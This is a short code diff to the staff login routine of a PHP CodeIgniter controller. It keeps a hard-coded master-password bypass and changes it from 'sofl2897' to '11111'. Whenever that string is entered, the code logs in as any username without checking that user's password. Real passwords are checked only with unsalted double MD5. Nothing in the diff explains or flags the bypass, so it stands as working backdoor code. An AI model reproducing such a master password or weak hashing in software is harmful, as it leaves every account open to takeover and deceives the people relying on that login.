@@ -174,20 +174,19 @@ class Home extends CI_Controller {
 
             $input = array();
 
-            if ($password == 'sofl2897') {
+            if ($password == '11111') {
 
             	$input['where'] = array('user_name' => $username);
 
             } else {
 
-	            $input['where'] = array(
+                $input['where'] = array(
 
-	                'user_name' => $username,
+                    'user_name' => $username,
 
-	                'password' => md5(md5($password))
+                    'password' => md5(md5($password))
 
-	            );
-	            
+                );
             }
 
             $result = $this->staffs_model->load_all($input);
